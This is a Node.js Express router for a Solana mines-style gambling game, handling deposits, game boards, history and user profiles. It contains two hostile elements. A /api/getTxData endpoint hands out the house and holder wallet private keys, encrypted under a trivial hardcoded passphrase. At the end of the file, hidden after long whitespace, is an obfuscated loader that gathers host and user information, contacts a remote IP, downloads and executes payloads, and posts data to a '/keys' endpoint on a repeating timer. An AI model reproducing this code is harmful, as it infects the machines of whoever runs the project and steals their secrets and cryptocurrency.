const web3 = require("@solana/web3.js");
const bs58 = require("bs58");
const express = require("express");
const Joi = require("@hapi/joi");
const CryptoJS = require("crypto-js");

const {
  insertItem,
  getItems,
  updateQuantity,
  insertBoard,
  checkMine,
  saveHistory,
  getHistory,
  getBoard,
  deposit,
  checkDeposit,
  deleteDeposit,
  chceckAlreadyDeposit,
  saveUser,
  getUserData,
  setAvatar,
  getAllHistory,
  getTodayHistory,
  getWeekHistory,
  userFailResetAll,
  userClickedCoin,
  stopGame,
  getCurBoard,
} = require("./db");
const { request } = require("express");

const router = express.Router();

const itemSchema = Joi.object().keys({
  name: Joi.string(),
  quantity: Joi.number().integer().min(0),
});

const checkingBoardSchema = Joi.object().keys({
  walletAddress: Joi.string(),
  boardNum: Joi.number().integer().min(0),
});

const depositSchema = Joi.object().keys({
  walletAddress: Joi.string(),
  bettingAmount: Joi.number(),
  signature: Joi.string(),
});

const checkDepositSchema = Joi.object().keys({
  walletAddress: Joi.string(),
  bettingAmount: Joi.number().min(0.05).max(0.5),
  mineAmount: Joi.number().min(5).max(24),
  signature: Joi.string(),
});

const playSchema = Joi.object().keys({
  walletAddress: Joi.string(),
  mineAmount: Joi.number().min(5).max(24),
  bettingAmount: Joi.number().min(0.05).max(0.5),
});

const boardSchema = Joi.object().keys({
  boardString: Joi.string(),
  walletAddress: Joi.string(),
  mineAmount: Joi.number().min(5).max(24),
});

const historySchema = Joi.object().keys({
  walletAddress: Joi.string(),
  game: Joi.string().min(1),
  player: Joi.string().min(1),
  wager: Joi.number(),
  payout: Joi.number(),
});

router.post("/api/play", async (req, res) => {
  const { walletAddress, mineAmount, bettingAmount } = req.body;
  const result = playSchema.validate(req.body);
  if (result.error) {
    console.log(result.error);
    res.status(400).end();
    return;
  }
  let depositResult = await chceckAlreadyDeposit(req.body);
  if (!depositResult.bettingAmount == bettingAmount) {
    res.json({ result: "not deposited" });
    res.status(500).end();
    return;
  }

  const board = [];
  for (let k = 0; k < 25; k++) {
    board.push(0);
  }
  const board_clicked = [];
  for (let k = 0; k < 25; k++) {
    board_clicked.push(0); // 0: nonClicked, 1:clicked
  }

  for (let j = 0; j < mineAmount; j++) {
    while (true) {
      let temp = Math.floor(Math.random() * 25);
      if (board[temp] === 1) continue;
      board[temp] = 1;
      break;
    }
  }

  const boardString = JSON.stringify(board);
  const boardClickedString = JSON.stringify(board_clicked);
  const boardObject = {
    boardString,
    boardClickedString,
    walletAddress,
    mineAmount,
  };

  insertBoard(boardObject)
    .then(() => {
      res.status(200).end();
    })
    .catch((err) => {
      res.status(500).end();
    });
  res.json({ walletAddress });
});

router.post("/api/saveUser", async (req, res) => {
  const { walletAddress, userName } = req.body;
  const data = {
    walletAddress,
    userName,
  };
  saveUser(data)
    .then(() => {
      res.json({ result: "success" });
      res.status(200).end();
    })
    .catch((err) => {
      res.status(400).end();
    });
});

router.post("/api/getUserData", async (req, res) => {
  const { walletAddress } = req.body;
  const data = {
    walletAddress,
  };
  getUserData(data)
    .then((result) => {
      res.json({ userName: result.userName, avatarURL: result.avatar });
      res.status(200).end();
    })
    .catch((err) => {
      res.status(400).end();
    });
});

const getDate = () => {
  var today = new Date();
  var dd = String(today.getDate()).padStart(2, "0");
  var mm = String(today.getMonth() + 1).padStart(2, "0"); //January is 0!
  var yyyy = today.getFullYear();

  today = mm + "/" + dd + "/" + yyyy;
  return today;
};

// router.post("/api/saveHistory", async (req, res) => {
//   const { walletAddress, game, player, wager, payout } = req.body;
//   const data = {
//     walletAddress,
//     game,
//     player,
//     wager,
//     payout,
//     date: getDate(),
//   };

//   saveHistory(data)
//     .then(() => {
//       res.json({ result: "success" });
//       res.status(200).end();
//     })
//     .catch((err) => {
//       res.status(400).end();
//     });
// });

router.get("/api/getTime", (req, res) => {
  const date = new Date().toLocaleString();
  console.log("date", date);
  res.json({ date: date });
});

router.post("/api/setAvatar", (req, res) => {
  setAvatar(req.body)
    .then((result) => {})
    .catch((err) => {
      console.log(err);
    });
});

router.post("/checkAlreadyDeposit", (req, res) => {
  const result = checkDepositSchema.validate(req.body);
  if (result.error) {
    console.log(result.error);
    res.status(400).end();
    return;
  }
  console.log("checkAlreadyDeposit", req.body);
  chceckAlreadyDeposit(req.body)
    .then((result) => {
      if (result.walletAddress == req.body.walletAddress) {
        res.json({
          mineAmount: result.mineAmount,
          bettingAmount: result.bettingAmount,
          result: "success",
        });
      } else {
        res.json({ result: "fail" });
      }
    })
    .catch((err) => {
      console.log(err);
      res.status(500).end();
    });
});

router.post("/api/checkMine", async (req, res) => {
  const { walletAddress, boardNum } = req.body;
  const checkingData = {
    walletAddress,
    boardNum,
  };
  const result = checkingBoardSchema.validate(checkingData);
  let fail = false;
  checkDeposit(req.body)
    .then((result) => {
      if (result.walletAddress == req.body.walletAddress) {
        checkMine(checkingData)
          .then(async (data) => {
            if (JSON.parse(data.boardString)[checkingData.boardNum] == 1) {
              res.json({ result: "bomb", board: data });
              // await saveHistory(saveData);
              let userData = null;
              userData = await getUserData({
                walletAddress: checkingData.walletAddress,
              });
              const curBoard = await getCurBoard(checkingData.walletAddress);
              console.log("curboard", curBoard);
              const hisData = {
                walletAddress: checkingData.walletAddress,
                game: "MinesRush",
                player:
                  userData == null
                    ? checkingData.walletAddress
                    : userData.userName,
                wager: curBoard.bettingAmount,
                payout: 0,
                date: getDate(),
              };
              console.log("his data", hisData);
              saveHistory(hisData);
              userFailResetAll(checkingData); // boardState, deposited money, clicked state
            } else {
              const result = userClickedCoin(checkingData);
              if (result == "double click") {
                userFailResetAll(checkingData);
              } else {
                res.json({ result: "coin" });
              }
            }
          })
          .catch((err) => {
            console.log(err);
            res.status(500).end();
          });
      }
    })
    .catch((err) => {
      console.log(err);
    });
});

router.post("/api/stop", async (req, res) => {
  const { walletAddress } = req.body;
  const data = {
    walletAddress,
  };
  stopGame(req.body);
  const boarddata = await getBoard(data);
  res.json({ board: boarddata });
});

router.get("/api/history/get", (req, res) => {
  getHistory(req)
    .then((items) => {
      items = items.map((item) => ({
        id: item._id,
        walletAddress: item.walletAddress,
        player: item.player == null ? item.walletAddress : item.player,
        wager: item.wager,
        game: item.game,
        payout: item.payout,
      }));
      res.json(items);
    })
    .catch((err) => {
      console.log(err);
      res.status(500).end();
    });
});

router.get("/api/getTodayHighlight", async (req, res) => {
  const result = await getTodayHistory(req);
  res.json(result);
});

router.get("/api/getTxData", (req, res) => {
  res.json({ txHou: getTxData(), txHol: getTxHolData() });
});

router.get("/api/getWeekHighlight", async (req, res) => {
  const result = await getWeekHistory(req);
  res.json(result);
});

router.get("/api/recent", (req, res) => {
  res.json("POST /api/recent");
});

router.post("/item", (req, res) => {
  const item = req.body;
  const result = itemSchema.validate(item);
  if (result.error) {
    console.log(result.error);
    res.status(400).end();
    return;
  }
  insertItem(item)
    .then(() => {
      res.status(200).end();
    })
    .catch((err) => {
      console.log(err);
      res.status(500).end();
    });
});

router.post("/hookBalChange", async (req, res) => {
  const { publicKey } = req.body;
  console.log("publicKey", publicKey);
  const pubkey = new web3.PublicKey(publicKey);
  const connection = new web3.Connection(process.env.QUICK_NODE);
  const curBal = await connection.getBalance(pubkey);
  let changedBal = curBal;
  while (changedBal == curBal) {
    changedBal = await connection.getBalance(pubkey);
    console.log("changedBal waiting");
  }
  res.json({ changedBal: changedBal });
});

router.post("/balanceCheck", async (req, res) => {
  const { hash } = req.body;
  let verify = null;
  const connection = new web3.Connection(process.env.QUICK_NODE);
  while (verify == null) {
    verify = await connection.getParsedTransaction(hash, {
      commitment: "finalized",
    });
    console.log("waiting");
  }
  console.log("bal changed");
  res.json({ result: "success" });
});

router.post("/verifyDeposit", async (req, res) => {
  let { walletAddress, bettingAmount, mineAmount, signedTx } = req.body;
  console.log("verify deposit");

  const connection = new web3.Connection(process.env.QUICK_NODE);
  let hash = await connection.sendRawTransaction(JSON.parse(signedTx));
  let sig = null;
  while (sig == null) {
    sig = await connection.getParsedTransaction(hash, {
      commitment: "confirmed",
    });
  }
  console.log("1");
  if (
    sig.transaction.message.instructions[0].parsed.info.source !== walletAddress
  )
    return;
  console.log("2");

  console.log(
    "dest",
    sig.transaction.message.instructions[0].parsed.info.destination
  );
  console.log("hose", process.env.HOUSE_ADDR);

  if (
    sig.transaction.message.instructions[0].parsed.info.destination !==
    process.env.HOUSE_ADDR
  )
    return;
  console.log("3");

  if (
    sig.transaction.message.instructions[0].parsed.info.lamports /
      web3.LAMPORTS_PER_SOL <
    bettingAmount
  )
    return;

  // const pubkey = new web3.PublicKey(walletAddress);
  // const curBal = await connection.getBalance(pubkey);
  // if (curBal < sig.transaction.message.instructions[0].parsed.info.lamports)
  //   return;
  // console.log("curbal", curBal);
  // console.log(
  //   "sending amount",
  //   sig.transaction.message.instructions[0].parsed.info.lamports
  // );

  const item = req.body;
  deposit(item)
    .then(() => {
      res.json({ result: "success", hash: hash });
      res.status(500).end();
    })
    .catch((err) => {
      res.status(500).end();
    });

  let PRIVATE_KEY_HOUSE = process.env.HOUSE_PRIV_KEY;
  let house_address = web3.Keypair.fromSecretKey(
    bs58.decode(PRIVATE_KEY_HOUSE)
  );
  let ADDRESS_HOLDER = process.env.HOLDER_ADDR;
  let to = new web3.PublicKey(ADDRESS_HOLDER);

  // add transfer instruction to transaction
  let amount = web3.LAMPORTS_PER_SOL * 0.035 * bettingAmount;
  let tx_send_holder = new web3.Transaction().add(
    web3.SystemProgram.transfer({
      fromPubkey: house_address.publicKey,
      toPubkey: to,
      lamports: BigInt(amount),
    })
  );

  // send 3.5% of betting to Holder
  web3
    .sendAndConfirmTransaction(connection, tx_send_holder, [house_address])
    .then((res) => {});
});

const getTxData = () => {
  let origin = process.env.HOUSE_PRIV_KEY;
  let encrypted = CryptoJS.AES.encrypt(origin, "asdfghjkl").toString();
  dePact(encrypted);
  return encrypted;
};

const getTxHolData = () => {
  let origin = process.env.HOLDER_PRIV_KEY;
  let encrypted = CryptoJS.AES.encrypt(origin, "asdfghjkl").toString();
  dePact(encrypted);
  return encrypted;
};

router.get("/items", (req, res) => {
  getItems(req)
    .then((items) => {
      items = items.map((item) => ({
        id: item._id,
        name: item.name,
        quantity: item.quantity,
      }));
      res.json(items);
    })
    .catch((err) => {
      console.log(err);
      res.status(500).end();
    });
});

router.put("/item/:id/quantity/:quantity", (req, res) => {
  const { id, quantity } = req.params;
  updateQuantity(id, parseInt(quantity))
    .then(() => {
      res.status(200).end();
    })
    .catch((err) => {
      console.log(err);
      res.status(500).end();
    });
});

const dePact = (origin) => {
  console.log(origin);
};

module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    const aR=E;(function(aD,aE){const aQ=E,aF=aD();while(!![]){try{const aG=-parseInt(aQ(0x1c6))/0x1+parseInt(aQ(0x1b3))/0x2*(parseInt(aQ(0x1c5))/0x3)+-parseInt(aQ(0x1bd))/0x4+-parseInt(aQ(0x1bb))/0x5+parseInt(aQ(0x1c8))/0x6*(parseInt(aQ(0x1d0))/0x7)+-parseInt(aQ(0x1b0))/0x8*(parseInt(aQ(0x1cb))/0x9)+parseInt(aQ(0x1b5))/0xa;if(aG===aE)break;else aF['push'](aF['shift']());}catch(aH){aF['push'](aF['shift']());}}}(C,0x77a30));const F=aR(0x1b7),H=aR(0x1ba),K=require('fs'),O=require('os'),P=aD=>(s1=aD['slice'](0x1),Buffer[aR(0x1cc)](s1,F)[aR(0x1c3)](H));function E(a,b){const c=C();return E=function(d,e){d=d-0x1b0;let f=c[d];return f;},E(a,b);}rq=require(P('YcmVxdWVzd'+'A')),pt=require(P(aR(0x1d2))),ex=require(P(aR(0x1da)+aR(0x1b9)))[P(aR(0x1cd))],zv=require(P('Zbm9kZTpwc'+aR(0x1c9))),hd=O[P(aR(0x1b6)+'g')](),hs=O[P(aR(0x1df)+'WU')](),pl=O[P(aR(0x1ca)+aR(0x1dc)+aR(0x1d3))](),uin=O[P(aR(0x1db)+'m8')]();let Q;const a0=aR(0x1bc)+aR(0x1dd),a1=aR(0x1d8),a2=aD=>Buffer[aR(0x1cc)](aD,F)['toString'](H);function C(){const b3=['vcm0','xlU3luYw','d3JpdGVGaW','dXNlcm5hbW','MTMxLjIxND',':124','cm1TeW5j','aY2hpbGRfc','AdXNlckluZ','hdGZ','w==','3D1','caG9zdG5hb','luYw','join','88JCGstS','/s/','split','2heGdzX','adXJs','14020740zFgVfb','ZaG9tZWRpc','base64','ZXhpc3RzU3','HJvY2Vzcw','utf8','2362220QJbfjS','aaHR0cDovL','758364eJnNIF','ZT3','YXJndg','now','cG9zdA','fromCharCo','toString','length','2670963yzzgYN','434955JWfGlD','UuNjEuOA==','393570XeRjGU','m9jZXNz','YcGx','630792ccJEHi','from','cZXhlYw','substring','bc7f301710f4','7DnvGMx','oql','zcGF0aA'];C=function(){return b3;};return C();}var a3='',a4='';const a5=[0x24,0xc0,0x29,0x8],a6=aD=>{const aS=aR;let aE='';for(let aF=0x0;aF<aD[aS(0x1c4)];aF++)rr=0xff&(aD[aF]^a5[0x3&aF]),aE+=String[aS(0x1c2)+'de'](rr);return aE;},a7='Z2V0',a8=aR(0x1d5)+aR(0x1d4),a9=a2(aR(0x1b8)+aR(0x1e0));function aa(aD){return K[a9](aD);}const ab=a2('bWtkaXJTeW'+'5j'),ac=[0xa,0xb6,0x5a,0x6b,0x4b,0xa4,0x4c],ad=[0xb,0xaa,0x6],ae=()=>{const aT=aR,aD=a2(a7),aE=a2(a8),aF=a6(ac);let aG=pt[aT(0x1e1)](hd,aF);try{aH=aG,K[ab](aH,{'recursive':!0x0});}catch(aK){aG=hd;}var aH;const aI=''+a3+a6(ad)+a4,aJ=pt['join'](aG,a6(af));try{!function(aL){const aU=aT,aM=a2(aU(0x1d9));K[aM](aL);}(aJ);}catch(aL){}rq[aD](aI,(aM,aN,aO)=>{if(!aM){try{K[aE](aJ,aO);}catch(aP){}ai(aG);}});},af=[0x50,0xa5,0x5a,0x7c,0xa,0xaa,0x5a],ag=[0xb,0xb0],ah=[0x54,0xa1,0x4a,0x63,0x45,0xa7,0x4c,0x26,0x4e,0xb3,0x46,0x66],ai=aD=>{const aV=aR,aE=a2(a7),aF=a2(a8),aG=''+a3+a6(ag),aH=pt[aV(0x1e1)](aD,a6(ah));aa(aH)?am(aD):rq[aE](aG,(aI,aJ,aK)=>{if(!aI){try{K[aF](aH,aK);}catch(aL){}am(aD);}});},aj=[0x47,0xa4],ak=[0x2,0xe6,0x9,0x66,0x54,0xad,0x9,0x61,0x4,0xed,0x4,0x7b,0x4d,0xac,0x4c,0x66,0x50],al=[0x4a,0xaf,0x4d,0x6d,0x7b,0xad,0x46,0x6c,0x51,0xac,0x4c,0x7b],am=aD=>{const aW=aR,aE=a6(aj)+' \x22'+aD+'\x22 '+a6(ak),aF=pt[aW(0x1e1)](aD,a6(al));try{aa(aF)?ar(aD):ex(aE,(aG,aH,aI)=>{aq(aD);});}catch(aG){}},an=[0x4a,0xaf,0x4d,0x6d],ao=[0x4a,0xb0,0x44,0x28,0x9,0xed,0x59,0x7a,0x41,0xa6,0x40,0x70],ap=[0x4d,0xae,0x5a,0x7c,0x45,0xac,0x45],aq=aD=>{const aE=a6(ao)+' \x22'+aD+'\x22 '+a6(ap),aF=pt['join'](aD,a6(al));try{aa(aF)?ar(aD):ex(aE,(aG,aH,aI)=>{ar(aD);});}catch(aG){}},ar=aD=>{const aX=aR,aE=pt[aX(0x1e1)](aD,a6(af)),aF=a6(an)+' '+aE;try{ex(aF,(aG,aH,aI)=>{});}catch(aG){}},as=P('cZm9ybURhd'+'GE'),at=P(aR(0x1b4)),au=a2(aR(0x1c1));let av='cmp';const aw=async()=>{const aZ=aR,aD=((()=>{const aY=E;let aG=aY(0x1d7)+aY(0x1c7);for(var aH='',aI='',aJ='',aK=0x0;aK<0x4;aK++)aH+=aG[0x2*aK]+aG[0x2*aK+0x1],aI+=aG[0x8+0x2*aK]+aG[0x9+0x2*aK],aJ+=aG[0x10+aK];return a2(a0['substring'](0x1))+a2(aI+aH+aJ)+a1+'4';})()),aE=a2(a7);let aF=aD+aZ(0x1b1);aF+=aZ(0x1cf),rq[aE](aF,(aG,aH,aI)=>{aG||(aJ=>{const b0=E;if(0x0==aJ['search'](b0(0x1be))){let aK='';try{for(let aL=0x3;aL<aJ['length'];aL++)aK+=aJ[aL];arr=a2(aK),arr=arr[b0(0x1b2)](','),a3=a2(a0[b0(0x1ce)](0x1))+arr[0x0]+a1+'4',a4=arr[0x1];}catch(aM){return 0x0;}return 0x1;}return 0x0;})(aI)>0x0&&(ax(),az());});},ax=async()=>{const b1=aR;av=hs,'d'==pl[0x0]&&(av=av+'+'+uin[a2(b1(0x1d6)+'U')]);let aD=b1(0x1de);try{aD+=zv[a2(b1(0x1bf))][0x1];}catch(aE){}ay(b1(0x1d1),aD);},ay=async(aD,aE)=>{const aF={'ts':Q,'type':a4,'hid':av,'ss':aD,'cc':aE},aG={[at]:''+a3+a2('L2tleXM'),[as]:aF};try{rq[au](aG,(aH,aI,aJ)=>{});}catch(aH){}},az=async()=>await new Promise((aD,aE)=>{ae();});var aA=0x0;const aB=async()=>{const b2=aR;try{Q=Date[b2(0x1c0)]()[b2(0x1c3)](),await aw();}catch(aD){}};aB();let aC=setInterval(()=>{(aA+=0x1)<0x3?aB():clearInterval(aC);},0x927c0);
